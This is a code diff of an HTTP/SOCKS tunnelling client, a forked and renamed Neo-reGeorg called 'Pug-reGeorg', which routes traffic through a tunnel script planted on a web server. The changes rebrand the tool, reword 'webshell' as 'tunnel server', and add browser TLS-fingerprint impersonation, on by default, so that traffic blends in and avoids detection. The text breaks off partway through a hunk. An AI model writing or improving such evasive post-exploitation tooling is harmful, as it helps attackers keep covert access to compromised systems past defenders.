@@ -1,8 +1,9 @@
+# Build: nhvyzojo
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-__author__  = 'L'
-__version__ = '5.3.0'
+__author__  = 'Pug'
+__version__ = '5.4.1'
 
 import sys
 import os
@@ -27,9 +28,18 @@ from threading import Thread
 try:
     from curl_cffi import requests
     using_curl_cffi = True
+    # BrowserType enum lists every impersonation profile supported by the
+    # installed curl_cffi build. Kept optional so older curl_cffi versions
+    # (which may not export it) still work; --list-impersonate falls back
+    # to the hardcoded RECOMMENDED_PROFILES pool below.
+    try:
+        from curl_cffi.requests import BrowserType as _CurlCffiBrowserType
+    except ImportError:
+        _CurlCffiBrowserType = None
 except ImportError:
     import requests
     using_curl_cffi = False
+    _CurlCffiBrowserType = None
 
 # Optional NTLM support
 NTLM_USER = os.environ.get('NTLM_USER')
@@ -72,6 +82,25 @@ ASYNCCONNECT     = False
 PHPSKIPCOOKIE = False
 GOSERVER      = False
 PHPTIMEOUT    = 0.5
+
+# TLS/HTTP fingerprint impersonation (curl_cffi).
+# 'chrome' is an alias that always maps to the latest Chrome fingerprint
+# packaged with the installed curl_cffi. Override per invocation via
+# --impersonate PROFILE or disable with --impersonate off.
+DEFAULT_IMPERSONATE = 'chrome'
+IMPERSONATE = DEFAULT_IMPERSONATE
+# Fallback pool for --list-impersonate when the installed curl_cffi does
+# not export BrowserType. Restricted to profiles that dominate real-world
+# traffic so the fingerprint blends in with the baseline of any modern
+# web target.
+RECOMMENDED_PROFILES = [
+    'chrome',
+    'chrome124',
+    'chrome120',
+    'firefox',
+    'safari17_0',
+    'edge101',
+]
 
 # Logging
 RESET_SEQ = "\033[0m"
@@ -208,7 +237,7 @@ def decode_body(data):
     try:
         data = base64.b64decode(data.translate(DecodeMap))
     except:
-        raise NeoregReponseFormatError("Base64 decode error")
+        raise PugregReponseFormatError("Base64 decode error")
     return blv_decode(data)
 
 
@@ -275,7 +304,7 @@ class SocksCmdNotImplemented(Exception):
     pass
 
 
-class NeoregReponseFormatError(Exception):
+class PugregReponseFormatError(Exception):
     pass
 
 
@@ -433,7 +462,7 @@ class session(Thread):
         return bool(mark)
 
 
-    def neoreg_request(self, info, timeout=None):
+    def pugreg_request(self, info, timeout=None):
         if self.redirectURL:
             info['REDIRECTURL'] = self.redirectURL
             if self.force_redirect:
@@ -457,7 +486,7 @@ class session(Thread):
                 rdata = extract_body(response.content)
                 rinfo = decode_body(rdata)
                 if rinfo is None:
-                    raise NeoregReponseFormatError("[HTTP] Response Format Error: {}".format(response.content))
+                    raise PugregReponseFormatError("[HTTP] Response Format Error: {}".format(response.content))
                 else:
                     if rinfo['STATUS'] != 'OK' and info['CMD'] != 'DISCONNECT':
                         log.warning('[%s] [%s:%d] Error: %s' % (info['CMD'], self.target, self.port, rinfo['ERROR']))
@@ -470,8 +499,8 @@ class session(Thread):
                 log.warning('[HTTP] [{}] [requests.exceptions.ConnectionError] {}'.format(info['CMD'], e))
             except requests.exceptions.ChunkedEncodingError as e: # python2 requests error
                 log.warning('[HTTP] [{}] [requests.exceptions.ChunkedEncodingError] {}'.format(info['CMD'], e))
-            except NeoregReponseFormatError as e: # python2 requests error
-                log.warning("[%s] [%s:%d] NeoregReponseFormatError, Retry: No.%d" % (info['CMD'], self.target, self.port, retry))
+            except PugregReponseFormatError as e: # python2 requests error
+                log.warning("[%s] [%s:%d] PugregReponseFormatError, Retry: No.%d" % (info['CMD'], self.target, self.port, retry))
                 if retry > MAXRETRY:
                     raise e
 
@@ -485,12 +514,12 @@ class session(Thread):
 
         if ( '.php' in self.connectURLs[0] or ASYNCCONNECT ) and not GOSERVER:
             try:
-                rinfo = self.neoreg_request(info, timeout=PHPTIMEOUT)
+                rinfo = self.pugreg_request(info, timeout=PHPTIMEOUT)
             except:
                 log.info("[CONNECT] [%s:%d] Session mark (%s)" % (self.target, self.port, self.mark))
                 return self.mark
         else:
-            rinfo = self.neoreg_request(info)
+            rinfo = self.pugreg_request(info)
 
         status = rinfo["STATUS"]
         if status == "OK":
@@ -512,7 +541,7 @@ class session(Thread):
 
             if hasattr(self, 'mark'):
                 info = {'CMD': 'DISCONNECT', 'MARK': self.mark}
-                rinfo = self.neoreg_request(info)
+                rinfo = self.pugreg_request(info)
             if not self.connect_closed:
                 if hasattr(self, 'target'):
                     log.info("[DISCONNECT] [%s:%d] Connection Terminated" % (self.target, self.port))
@@ -528,7 +557,7 @@ class session(Thread):
                 try:
                     if self.connect_closed or self.pSocket.fileno() == -1:
                         break
-                    rinfo = self.neoreg_request(info)
+                    rinfo = self.pugreg_request(info)
                     if rinfo['STATUS'] == 'OK':
                         data = rinfo['DATA']
                         data_len = len(data)
@@ -565,7 +594,7 @@ class session(Thread):
                     if not raw_data:
                         break
                     info['DATA'] = raw_data
-                    rinfo = self.neoreg_request(info)
+                    rinfo = self.pugreg_request(info)
                     if rinfo['STATUS'] != "OK":
                         break
                     n += 1
@@ -599,8 +628,8 @@ class session(Thread):
                 w.start()
                 r.join()
                 w.join()
-        except NeoregReponseFormatError as ex:
-            log.error('[HTTP] [NeoregReponseFormatError] {}'.format(ex))
+        except PugregReponseFormatError as ex:
+            log.error('[HTTP] [PugregReponseFormatError] {}'.format(ex))
         except SocksCmdNotImplemented as ex:
             log.error('[SOCKS5] [SocksCmdNotImplemented] {}'.format(ex))
         except requests.exceptions.ConnectionError as ex:
@@ -612,9 +641,9 @@ class session(Thread):
                 self.closeRemoteSession()
 
 
-def askNeoGeorg(conn, connectURLs, redirectURLs, force_redirect):
+def askPugGeorg(conn, connectURLs, redirectURLs, force_redirect):
     # only check first
-    log.info("[Ask NeoGeorg] Checking if NeoGeorg is ready")
+    log.info("[Ask PugGeorg] Checking if PugGeorg is ready")
     headers = {}
     headers.update(HEADERS)
 
@@ -623,7 +652,7 @@ def askNeoGeorg(conn, connectURLs, redirectURLs, force_redirect):
 
     need_exit = False
     try:
-        log.debug("[HTTP] Ask NeoGeorg Request".format())
+        log.debug("[HTTP] Ask PugGeorg Request".format())
         if redirectURLs:
             info = {'REDIRECTURL': redirectURLs[0]}
             if force_redirect:
@@ -635,33 +664,33 @@ def askNeoGeorg(conn, connectURLs, redirectURLs, force_redirect):
             response = conn.post(connectURLs[0], headers=headers, timeout=10, data=data)
         else:
             response = conn.get(connectURLs[0], headers=headers, timeout=10)
-        log.debug("[HTTP] Ask NeoGeorg Response => HttpCode: {}".format(response.status_code))
+        log.debug("[HTTP] Ask PugGeorg Response => HttpCode: {}".format(response.status_code))
         if not PHPSKIPCOOKIE and ( '.php' in connectURLs[0] or ASYNCCONNECT ):
             if 'Expires' in response.headers:
                 expires = response.headers['Expires']
                 try:
                     expires_date = datetime.strptime(expires, '%a, %d %b %Y %H:%M:%S %Z')
                     if mktime(expires_date.timetuple()) < time():
-                        log.warning('[Ask NeoGeorg] Server Session expired')
+                        log.warning('[Ask PugGeorg] Server Session expired')
                         if 'Set-Cookie' in response.headers:
                             cookie = ''
                             for k, v in response.cookies.items():
                                 cookie += '{}={};'.format(k, v)
                             HEADERS.update({'Cookie' : cookie})
-                            log.warning("[Ask NeoGeorg] Automatically append Cookies: {}".format(cookie))
+                            log.warning("[Ask PugGeorg] Automatically append Cookies: {}".format(cookie))
                         else:
-                            log.error('[Ask NeoGeorg] There is no valid cookie return')
+                            log.error('[Ask PugGeorg] There is no valid cookie return')
                             need_exit = True
                 except ValueError:
-                    log.warning('[Ask NeoGeorg] Expires wrong format: {}'.format(expires))
+                    log.warning('[Ask PugGeorg] Expires wrong format: {}'.format(expires))
     except requests.exceptions.ConnectionError:
-        log.error("[Ask NeoGeorg] NeoGeorg server connection error")
+        log.error("[Ask PugGeorg] PugGeorg server connection error")
         exit()
     except requests.exceptions.ConnectTimeout:
-        log.error("[Ask NeoGeorg] NeoGeorg server connection timeout")
+        log.error("[Ask PugGeorg] PugGeorg server connection timeout")
         exit()
     except Exception as ex:
-        log.error("[Ask NeoGeorg] NeoGeorg is not ready, please check URL")
+        log.error("[Ask PugGeorg] PugGeorg is not ready, please check URL")
         log.exception(ex)
         exit()
 
@@ -669,34 +698,34 @@ def askNeoGeorg(conn, connectURLs, redirectURLs, force_redirect):
         exit()
 
     if redirectURLs and response.status_code >= 400:
-        log.warning('[Ask NeoGeorg] Using redirection will affect performance when the response code >= 400')
+        log.warning('[Ask PugGeorg] Using redirection will affect performance when the response code >= 400')
 
     data = response.content
     data = extract_body(data)
 
     if BASICCHECKSTRING == data.strip():
-        log.info("[Ask NeoGeorg] NeoGeorg says, 'All seems fine'")
+        log.info("[Ask PugGeorg] PugGeorg says, 'Endpoint ready'")
         return True
     elif BASICCHECKSTRING in data:
         left_offset = data.index(BASICCHECKSTRING)
         right_offset = len(data) - ( left_offset + len(BASICCHECKSTRING) )
-        log.error("[Ask NeoGeorg] NeoGeorg is ready, but the body needs to be offset")
+        log.error("[Ask PugGeorg] PugGeorg is ready, but the body needs to be offset")
         args_tips = ''
         if left_offset:
             args_tips += ' --cut-left {}'.format(left_offset)
         if right_offset:
             args_tips += ' --cut-right {}'.format(right_offset)
-        log.error("[Ask NeoGeorg] You can set the `{}` parameter to body offset".format(args_tips))
+        log.error("[Ask PugGeorg] You can set the `{}` parameter to body offset".format(args_tips))
         exit()
     else:
         if args.skip:
-            log.debug("[Ask NeoGeorg] Ignore detecting that NeoGeorg is ready")
+            log.debug("[Ask PugGeorg] Ignore detecting that PugGeorg is ready")
 
         else:
-            log.warning('[Ask NeoGeorg] Expect Response: {}'.format(BASICCHECKSTRING[0:100]))
-            log.warning('[Ask NeoGeorg] Real Response: {}'.format(data.strip()[0:100]))
-            log.error("[Ask NeoGeorg] NeoGeorg is not ready, please check URL and KEY. rep: [{}] {}".format(response.status_code, response.reason))
-            log.error("[Ask NeoGeorg] You can set the `--skip` parameter to ignore errors")
+            log.warning('[Ask PugGeorg] Expect Response: {}'.format(BASICCHECKSTRING[0:100]))
+            log.warning('[Ask PugGeorg] Real Response: {}'.format(data.strip()[0:100]))
+            log.error("[Ask PugGeorg] PugGeorg is not ready, please check URL and KEY. rep: [{}] {}".format(response.status_code, response.reason))
+            log.error("[Ask PugGeorg] You can set the `--skip` parameter to ignore errors")
             exit()
 
 
@@ -713,57 +742,67 @@ def extract_body(data):
 
 
 def choice_useragent():
+    # Fallback UA pool used only when TLS impersonation is disabled
+    # (--impersonate off or curl_cffi missing). When impersonation is
+    # active, curl_cffi sets a UA that matches the chosen browser profile
+    # for JA3/JA4/HTTP2/UA coherence, and this pool is never touched.
     user_agents = [
-       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
-       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16",
-       "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
-       "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
-       "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
-       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.11 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.11",
-       "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0",
-       "Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0",
-       "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0",
-       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:38.0) Gecko/20100101 Firefox/38.0"
+       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+       "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+       "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
+       "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:133.0) Gecko/20100101 Firefox/133.0",
+       "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
+       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
     ]
     return random.choice(user_agents)
 
 
 
 banner = r"""
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠴⠒⠒⢶⡀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡶⠶⠶⢦⣄⣀⣀⣠⠤⢶⣺⣍⡉⢺⣿⣶⣶⣄⠹⡄⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡇⠀⠈⠙⠿⣭⣷⣦⣤⣌⣉⣛⠻⢿⣿⣿⣿⣿⣦⣹⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠶⠾⣍⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠿⣿⣶⣍⠻⣿⣿⣿⣿⡇⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠙⢦⣀⠀⠈⠙⠒⠒⠒⢒⣶⣶⣄⡀⠀⠀⠀⠀⠀⠙⢿⣿⣮⡛⣧⠀⢹⣄⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠤⠖⠊⠉⠉⠓⠶⠦⣄⣀⠉⠉⠿⠀⣀⣉⡠⠤⠤⠶⢭⣀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣮⣟⢿⣿⣷⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠁⠀⠀⠀⠀⠀⢶⡀⠀⠀⠹⣶⠚⠋⠉⠉⠁⠀⢀⣠⠴⠚⠛⠓⠒⢲⣶⡤⠄⠀⠀⠐⣾⢿⣷⣟⢻⡆⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡴⠋⣠⠶⠛⠉⠑⢶⠀⢀⡾⠷⡄⠀⠀⠈⠐⣦⠀⠀⠀⡰⠋⠀⣠⣶⣶⣶⣞⣽⣶⢾⣿⣿⠷⣶⠘⣆⠈⠛⢿⣷⡀
+⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠛⠉⠙⠾⣷⡄⡀⠀⢠⡞⢀⢨⡇⠀⠀⢠⡶⠞⠛⢿⡀⠀⠀⡇⠀⠀⠉⢻⣿⣿⣿⣩⣶⠿⣿⣿⣿⡞⣧⠈⢳⡀⠀⠉⠁
+⠀⠀⠀⠀⠀⠀⠀⣴⠋⣠⠀⠀⢠⡟⣿⢿⡇⢀⡞⢁⡞⢸⡇⠀⠀⠸⣇⠀⠀⠀⠱⢄⠀⢧⡀⠀⣀⣀⣹⣿⣿⣿⢡⣴⣿⣿⣿⣷⢿⡆⠀⠙⡆⠀⠀         Pug-reGeorg
+⠀⠀⠀⠀⠀⠀⣼⣣⡾⠃⠀⢀⡞⣰⣿⣾⠀⣾⠀⡞⢀⡟⠀⠀⢀⡴⢿⣦⡄⠀⠀⠈⢷⣾⡿⠟⠛⠿⠿⣿⣿⣿⣦⡝⠿⠿⠿⣣⣿⣿⡆⠀⢹⡆⠀
+⠀⠀⠀⠀⠀⣾⠿⣿⠁⠀⠀⣾⣿⣿⠟⠁⠰⠃⢸⠁⢸⠁⣠⠔⠋⠀⠀⡹⠿⣷⡄⠀⠀⠀⠀⢀⣰⣿⣶⣦⣆⠀⠉⠉⠉⠛⠿⣿⣿⣿⣷⠀⠸⡇⠀        version {}
+⠀⠀⠀⠀⠀⡇⣠⣿⣷⣶⣾⣯⣿⣿⠀⠀⠀⠀⡏⠀⣼⡜⠁⢠⣴⣿⣶⣷⣦⣟⡇⠀⠀⣠⣾⣛⡍⢻⣿⢛⡿⣿⣷⣦⣤⣤⣤⣄⡙⢾⠇⠀⠀⣇⠀
+⠀⠀⠀⠀⣰⣷⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⢁⡴⠋⣠⣶⣿⣿⣿⣿⣿⣿⡿⠀⠤⣴⡟⢺⣷⡽⣦⡻⠟⢶⡄⡮⠭⠍⠿⢯⣟⣻⢧⡈⢷⢧⢸⡀
+⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⡟⢠⢾⣿⣿⣿⣿⣿⣿⣿⢿⡄⠀⣻⣿⣀⡴⠛⠇⢻⣻⣶⠃⠙⣃⣤⡴⠂⠀⠀⣤⣤⣙⣦⣼⣿⠇
+⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⢀⡇⠀⣼⣿⣿⣉⣩⣿⣾⣿⣾⡇⠀⠀⣿⣯⣾⣭⣯⡿⠁⠙⣷⣠⣶⣶⠶⢀⣀⡀⠙⠻⢿⣍⠉⢿⠀
+⠀⣴⣿⣿⣿⣿⣿⡟⡿⠻⠛⠿⣿⣏⠀⠀⠀⠸⡇⠀⣿⣿⣿⣿⣿⣿⣿⠟⣸⡇⠀⢠⣿⣽⣷⠟⣍⠀⠀⢠⣿⡿⠛⠛⠛⠻⣷⣿⣓⠀⣠⣌⠁⢸⡄
+⠀⣿⠹⣿⣿⣿⣿⠁⠀⠀⠀⠀⣿⠻⣦⡀⠀⠀⠱⣄⣿⣮⣉⠛⠛⢋⠵⣲⣿⠀⢀⡾⣿⣛⣿⢿⡏⠀⠀⡾⠃⠀⠀⠀⠀⢤⣸⣿⣿⣧⡻⠿⠥⢸⡇
+⠀⠈⠳⢿⣿⣿⣿⣤⣀⣤⣀⣼⣿⣆⢻⡳⠄⠀⠀⠈⢿⠻⢿⣿⣿⡯⠾⠋⣿⠀⣾⣧⣟⡏⠁⡿⠃⠀⣾⠃⠀⠀⣧⣧⣠⣽⣿⣿⣿⣿⣿⣿⠿⠟⠀
+⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⡇⠘⣄⢧⠀⠀⠀⠀⠀⣇⠀⠈⠙⠲⠶⢴⣿⢠⣿⠾⣼⢀⣼⠀⠀⣸⣿⣿⣆⣿⣿⣿⣿⣿⣿⣿⣿⣿⢯⠁⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⠿⢫⡄⠀⠹⣎⠀⠀⠀⠀⠀⢸⡆⠀⠀⠘⣦⠀⢹⡎⢹⡄⢀⣼⠇⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⢸⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⠀⠙⢦⠀⠀⠀⠀⠈⢻⣤⡀⠀⠘⣆⢸⣿⠀⢳⠉⢴⢀⠀⣿⣿⣿⣿⣿⣿⣿⡿⠿⠋⢹⠇⠀⠀⢸⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⡄⠈⢳⣄⠀⠀⠀⠀⠈⠉⠙⠓⠿⣟⡛⢦⡈⣷⠐⠁⣼⣿⣿⣿⡿⠟⠛⠁⠀⠀⣰⠏⠀⠀⠀⣸⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠙⠳⣝⢦⣀⠀⠀⠀⠀⠀⣈⣩⡷⠿⣿⠰⣾⠿⠟⠋⠙⢦⡀⠀⠀⠀⣰⣇⣀⣠⠴⢾⡟⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⡙⠷⣄⣉⠙⠛⠛⠉⠁⠀⠀⣀⡼⠛⠁⠀⠀⠀⠀⠈⢳⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⣌⡉⠙⠒⠶⠤⠶⠖⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⣧⡞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 
-          "$$$$$$''  'M$  '$$$@m
-        :$$$$$$$$$$$$$$''$$$$'
-       '$'    'JZI'$$&  $$$$'
-                 '$$$  '$$$$
-                 $$$$  J$$$$'
-                m$$$$  $$$$,
-                $$$$@  '$$$$_          Neo-reGeorg
-             '1t$$$$' '$$$$<
-          '$$$$$$$$$$'  $$$$          version {}
-               '@$$$$'  $$$$'
-                '$$$$  '$$$@
-             'z$$$$$$  @$$$
-                r$$$   $$|
-                '$$v c$$
-               '$$v $$v$$$$$$$$$#
-               $$x$$$$$$$$$twelve$$$@$'
-             @$$$@L '    '<@$$$$$$$$`
-           $$                 '$$$
-
-
-    [ Github ] https://github.com/L-codes/Neo-reGeorg
+    [ Github ] https://github.com/h4rry1337/Pug-reGeorg
 """.format(__version__)
 
 use_examples = r"""
                 [ Basic Use ]
 
-   ./neoreg.py generate -k <you_password>
-   ./neoreg.py -k <you_password> -u <server_url>
+   ./pugreg.py generate -k <you_password>
+   ./pugreg.py -k <you_password> -u <server_url>
 
                [ Advanced Use ]
 
-   ./neoreg.py generate -k <you_password> --file 404.html
-   ./neoreg.py -k <you_password> -u <server_url> \
+   ./pugreg.py generate -k <you_password> --file 404.html
+   ./pugreg.py -k <you_password> -u <server_url> \
            --skip --proxy http://127.0.0.1:8080 -vv \
            -H 'Authorization: cm9vdDppcyB0d2VsdmU='
 
@@ -776,17 +815,34 @@ if __name__ == '__main__':
         exit()
     elif len(sys.argv) > 1 and sys.argv[1] == 'generate':
         del sys.argv[1]
-        parser = argparse.ArgumentParser(description='Generate neoreg webshell')
+        parser = argparse.ArgumentParser(description='Generate pugreg tunnel server')
         parser.add_argument("-k", "--key", metavar="KEY", required=True, help="Specify connection key.")
-        parser.add_argument("-o", "--outdir", metavar="DIR", help="Output directory.", default='neoreg_servers')
+        parser.add_argument("-o", "--outdir", metavar="DIR", help="Output directory.", default='pugreg_servers')
         parser.add_argument("-f", "--file", metavar="FILE", help="Camouflage html page file")
         parser.add_argument("-c", "--httpcode", metavar="CODE", help="Specify HTTP response code. When using -r, it is recommended to <400 (default: 200)", type=int, default=200)
-        parser.add_argument("-T", "--request-template", metavar="STR/FILE", help="HTTP request template (eg: 'img=data:image/png;base64,NEOREGBODY&save=ok')", type=str)
+        parser.add_argument("-T", "--request-template", metavar="STR/FILE", help="HTTP request template (eg: 'img=data:image/png;base64,PUGREGBODY&save=ok')", type=str)
         parser.add_argument("--read-buff", metavar="Bytes", help="Remote read buffer (default: 513)", type=int, default=513)
         parser.add_argument("--max-read-size", metavar="KB", help="Remote max read size (default: 512)", type=int, default=512)
         args = parser.parse_args()
+    elif '--list-impersonate' in sys.argv:
+        if _CurlCffiBrowserType is not None:
+            profiles = sorted(_CurlCffiBrowserType.__members__.keys())
+        else:
+            profiles = list(RECOMMENDED_PROFILES)
+        print("Available impersonation profiles:")
+        for p in profiles:
+            print("  " + p)
+        print("")
+        print("Special values:")
+        print("  chrome | firefox | safari | edge   Alias for the latest packaged profile")
+        print("  off                                Disable impersonation (use python-requests fingerprint)")
+        if not using_curl_cffi:
+            print("")
+            print("[!] curl_cffi is not installed; only the recommended profile pool is shown.")
+            print("    Install with: pip install -r requirements.txt")
+        exit()
     else:
-        parser = argparse.ArgumentParser(description="Socks server for Neoreg HTTP(s) tunneller (DEBUG MODE: -k debug)")
+        parser = argparse.ArgumentParser(description="Socks server for Pugreg HTTP(s) tunneller (DEBUG MODE: -k debug)")
         parser.add_argument("-u", "--url", metavar="URI", required=True, help="The url containing the tunnel script", action='append')
         parser.add_argument("-r", "--redirect-url", metavar="URL", help="Intranet forwarding the designated server (only java/.net)", action='append')
         parser.add_argument("-R", "--force-redirect", help="Forced forwarding (only jsp -r)", action='store_true')
@@ -798,7 +854,7 @@ if __name__ == '__main__':
         parser.add_argument("-H", "--header", metavar="LINE", help="Pass custom header LINE to server", action='append', default=[])
         parser.add_argument("-c", "--cookie", metavar="LINE", help="Custom init cookies")
         parser.add_argument("-x", "--proxy", metavar="LINE", help="Proto://host[:port]  Use proxy on given port", default=None)
-        parser.add_argument("-T", "--request-template", metavar="STR/FILE", help="HTTP request template (eg: 'img=data:image/png;base64,NEOREGBODY&save=ok')", type=str)
+        parser.add_argument("-T", "--request-template", metavar="STR/FILE", help="HTTP request template (eg: 'img=data:image/png;base64,PUGREGBODY&save=ok')", type=str)
         parser.add_argument("-a", "--async-connect", help="Asynchronous CONNECT (e.g., in PHP, Node.js)", action='store_true')
         parser.add_argument("--php-skip-cookie", help="Skip cookie availability check in php", action='store_true')
         parser.add_argument("--go", help="Use go connection method", action='store_true')
@@ -811,17 +867,19 @@ if __name__ == '__main__':
         parser.add_argument("--max-retry", metavar="N", help="Max retry requests (default: {})".format(MAXRETRY), type=int, default=MAXRETRY)
         parser.add_argument("--cut-left", metavar="N", help="Truncate the left side of the response body", type=int, default=0)
         parser.add_argument("--cut-right", metavar="N", help="Truncate the right side of the response body", type=int, default=0)
-        parser.add_argument("--extract", metavar="EXPR", help="Manually extract BODY content (eg: <html><p>NEOREGBODY</p></html> )")
+        parser.add_argument("--extract", metavar="EXPR", help="Manually extract BODY content (eg: <html><p>PUGREGBODY</p></html> )")
         parser.add_argument("--ntlm-auth", metavar="USER:PASS", help="Enable NTLM authentication for web requests (format: DOMAIN\\USER:PASSWORD or USER:PASSWORD)")
+        parser.add_argument("--impersonate", metavar="PROFILE", help="Browser TLS/HTTP fingerprint profile (JA3/JA4/HTTP2). Impersonation is ON by default ({}); use this only to pin a specific profile or 'off' to disable. See --list-impersonate for available profiles".format(DEFAULT_IMPERSONATE), default=DEFAULT_IMPERSONATE)
+        parser.add_argument("--list-impersonate", help="List impersonation profiles supported by the installed curl_cffi and exit", action='store_true')
         parser.add_argument("-v", help="Increase verbosity level (use -vv or more for greater effect)", action='count', default=0)
         args = parser.parse_args()
 
         if args.extract:
-            if 'NEOREGBODY' not in args.extract:
-                print('[!] Error extracting expression, `NEOREGBODY` not found')
+            if 'PUGREGBODY' not in args.extract:
+                print('[!] Error extracting expression, `PUGREGBODY` not found')
                 exit()
             else:
-                expr = re.sub('NEOREGBODY', r'\\s*([A-Za-z0-9+/]*(?:=|==)?|<!-- [a-zA-Z0-9+/]+ -->)\\s*', re.escape(args.extract))
+                expr = re.sub('PUGREGBODY', r'\\s*([A-Za-z0-9+/]*(?:=|==)?|<!-- [a-zA-Z0-9+/]+ -->)\\s*', re.escape(args.extract))
                 EXTRACT_EXPR = re.compile(expr, re.S)
 
     global request_template
@@ -833,10 +891,10 @@ if __name__ == '__main__':
         except:
             request_template = args.request_template
 
-        if 'NEOREGBODY' in request_template:
-            request_template = request_template.split('NEOREGBODY', 1)
+        if 'PUGREGBODY' in request_template:
+            request_template = request_template.split('PUGREGBODY', 1)
         else:
-            print('[!] Error request template, `NEOREGBODY` not found')
+            print('[!] Error request template, `PUGREGBODY` not found')
             exit()
 
 
@@ -862,7 +920,7 @@ if __name__ == '__main__':
     BASICCHECKSTRING = ('<!-- ' + rand.rand_value() + ' -->').encode()
 
     if 'url' in args:
-        # neoreg connect
+        # pugreg connect
         if args.v > 3:
             args.v = 3
 
@@ -918,26 +976,52 @@ if __name__ == '__main__':
             for url in args.redirect_url:
                 print("    "+url)
 
-        if not using_curl_cffi:
-            log.warning("[!] curl_cffi is not available. Falling back to the standard 'requests' module.")
+        # --- Resolve TLS/HTTP fingerprint impersonation strategy ---
